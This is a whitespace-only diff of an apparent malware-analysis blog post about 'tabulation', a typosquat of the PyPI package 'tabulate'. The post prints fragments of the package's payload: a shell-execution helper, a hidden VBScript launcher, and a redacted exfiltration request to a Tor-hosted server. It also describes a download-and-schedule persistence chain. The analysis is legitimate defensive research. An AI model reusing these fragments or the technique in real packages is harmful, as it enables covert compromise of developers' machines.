@@ -12,7 +12,7 @@ tags:
 
 Before we begin, a gentle shoutout to Lockness Ko, our dynamic analysis specialist, for his assistance with the dynamic analysis portion of this particular malicious package.
 
-On the 26th of June, a Python package named **tabulation** came across our malware feed. It displayed all the signs of being a malicious package-- executing a base64 string within the setup.py portion of the package, and squatting a fairly well known package, **tabulate** by utilizing it's README and Github pages in the metadata. As we do with all packages that are suspected to be malicious, we began an analysis. 
+On the 26th of June, a Python package named **tabulation** came across our malware feed. It displayed all the signs of being a malicious package-- executing a base64 string within the setup.py portion of the package, and squatting a fairly well known package, **tabulate** by utilizing it's README and Github pages in the metadata. As we do with all packages that are suspected to be malicious, we began an analysis.
 
 ## The Payload
 
@@ -45,7 +45,7 @@ So let's unpack this a bit. As with most of these, you can simply swap the `exec
 
 ```python
 import subprocess, os
-def r(c): 
+def r(c):
     result = subprocess.Popen(c, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
     output = result.stdout.read()
 def r2(c):
@@ -60,7 +60,7 @@ if os.name == "nt":
 Now this is a little more exciting. As we can see, we use Powershell's `Invoke-WebRequest` to quietly curl down an **install.zip** file from transfer.sh and to unpack it into a known location. It then invokes the Windows Task Scheduler to execute **invis.vbs** a minute after the subprocess is executed. Presumably, this is to allow for the file to download and decompress. But what exactly do these files contain, and what is invis.vbs doing?
 
 ```vb
-Set oShell = CreateObject ("Wscript.Shell") 
+Set oShell = CreateObject ("Wscript.Shell")
 Dim strArgs
 strArgs = "cmd /c pythonw C:\ProgramData\Install\inst.pyw"
 oShell.Run strArgs, 0, false
@@ -106,7 +106,7 @@ Running this, as anticipated, caused any POSTs utilizing the Python Requests pac
 ```
 REQUEST
 xxxx://xxxx.tor.pm/
-{'1': 'gAAAAABkoRHTIO_HSkSBxDbFaarHWwX8T1qKIUgbuhaf0-294oY_TR1RuYFPVXYBkG5lQIKw2rRV7oPxL-CaKsiPerMKdwV5sUO1MEn3GZw3RToeSQXqvYo=', 
+{'1': 'gAAAAABkoRHTIO_HSkSBxDbFaarHWwX8T1qKIUgbuhaf0-294oY_TR1RuYFPVXYBkG5lQIKw2rRV7oPxL-CaKsiPerMKdwV5sUO1MEn3GZw3RToeSQXqvYo=',
 ...}
 ```
 
@@ -114,11 +114,11 @@ And that's not shockingly helpful. However, we do have some excellent pretext fo
 
 ```
 ========
-model vbox harddisk  
+model vbox harddisk
 ==============
-product  virtualbox  
+product  virtualbox
 ==============
-version  vbox- 1  
+version  vbox- 1
 ==============
 name system idle process system  registrysmss.execsrss.exe  wininit.exeservices.exe  lsass.exe  svchost.exesvchost.exefontdrvhost.exe  svchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.execsrss.exe  winlogon.exe  fontdrvhost.exe  dwm.exe sihost.exe taskhostw.exe explorer.exe  shellexperiencehost.exeruntimebroker.exeruntimebroker.exeapplicationframehost.exe  svchost.exediscord.exediscord.exediscord.exediscord.exediscord.exediscord.exegooglecrashhandler.exe googlecrashhandler64.exe  procmon64.exe cmd.exe conhost.exepowershell.exechrome.exe chrome.exe chrome.exe chrome.exe chrome.exe chrome.exe chrome.exe chrome.exe cmd.exe conhost.exepythonw.exewmiprvse.exe  wmic.execonhost.exe
 ```
